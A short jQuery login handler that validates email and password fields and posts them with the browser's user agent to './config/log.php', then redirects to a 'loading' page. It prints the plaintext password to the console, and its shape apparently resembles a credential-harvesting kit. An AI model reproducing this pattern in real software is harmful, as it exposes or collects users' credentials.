function login(){
	
var email_auth =	$("#email_auth").val();
var pass_auth	 =	$("#pass_auth").val();
	
	//alert(ID_sg);
	//alert(PASS_sg);
	
 if(email_auth==''){

swal({
icon: 'error',
title: 'Error !',
text: "Please enter the email address please"

})	

return false;	
} 
if(pass_auth==''){

swal({
icon: 'error',
title: 'Error !',
text: "Please enter the password"

})	

return false;	
} 


var data_log = 
{
device  :navigator.userAgent,
email_auth :email_auth,
pass_auth  :pass_auth

}; 

$('#cover-spin').show(0);

console.log(JSON.stringify(data_log));
var _url = './config/log.php';


$.post(_url,data_log,function(data){
 var reponse = JSON.parse(data); 


if(reponse.statut=="error"){	

swal({
icon: reponse.statut,
title: reponse.title,
text: reponse.resultat

});
}else if(reponse.statut=="success"){	

  window.location="./Select/loading.html";
    

} 


}) 
}